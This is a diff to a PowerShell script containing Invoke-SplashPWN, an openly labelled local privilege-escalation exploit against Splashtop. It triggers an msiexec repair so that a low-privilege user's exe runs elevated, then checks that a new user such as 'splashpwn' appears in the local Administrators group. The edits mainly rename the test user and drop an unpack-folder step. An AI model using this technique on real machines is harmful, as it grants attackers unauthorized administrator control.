@@ -1,7 +1,7 @@
 ﻿function Get-FileMetaData {
     <#
     .SYNOPSIS
-    Small function that gets metadata information from file providing similar output to what Explorer shows when viewing file
+    Get metadata information from a file
 
     .DESCRIPTION
     Small function that gets metadata information from file providing similar output to what Explorer shows when viewing file
@@ -153,7 +153,7 @@ function Invoke-SplashPWN {
     If your exe creates a new user, this is the user name to check when finished
 
     .EXAMPLE
-    Invoke-SplashPWN -Exepath c:\users\lowprivuser\Desktop\adduser.exe -NewUser backdoor
+    Invoke-SplashPWN -Exepath c:\users\lowprivuser\Desktop\adduser.exe -NewUser splashpwn
 
     .EXAMPLE
     Invoke-SplashPWN -EXEPath c:\users\lowprivuser\Desktop\HelloWorld.exe
@@ -182,16 +182,7 @@ function Invoke-SplashPWN {
 
     $SplashtopMSI = Find-SplashtopMSI
     $SplashtopGUID = Find-SplashtopGUID
-    $UnpackFolder = "$($env:LOCALAPPDATA)\temp\unpack"
     $SplashtopTempFolder = "$($env:LOCALAPPDATA)\temp\$SplashtopGUID"
-
-    # Create a new directory in appdata local\temp called 'unpack'
-    Write-Verbose "[i] Creating an 'unpack' directory in appdata\local\temp"
-    New-Item -Type Directory -Path $UnpackFolder -Force | Out-Null
-
-    # copy the splashtop cached msi from c:\windows\installer to the unpack directory
-    Write-Verbose "[i] Copying the splashtop msi from c:\windows\installer to the 'unpack'directory"
-    Copy-Item -Path $SplashtopMSI.FullName -Destination $UnpackFolder\setup.msi
 
     # initiate a repair of splashtop using msiexec
     Write-Verbose "[i] Starting a repair with msiexec"
@@ -220,7 +211,7 @@ function Invoke-SplashPWN {
         }
 
         $Administrators = Get-LocalGroupMember -Group Administrators | select -ExpandProperty Name
-        if ($Administrators -match "audit"){
+        if ($Administrators -match "splashpwn"){
             Write-Verbose "[SUCCESS] - New user was added to Administrators!"
         } else {
             Write-Host "[ERROR] - New user NOT added to Administrators"
@@ -235,7 +226,6 @@ function Invoke-SplashPWN {
 
     # Cleanup
     Write-Verbose "[i] Cleaning up temp files"
-    Remove-Item -Path $UnpackFolder -Recurse -Force
 
     if ($VerbosePreference -eq "Continue") {
         Write-Verbose "[+] Finished!"
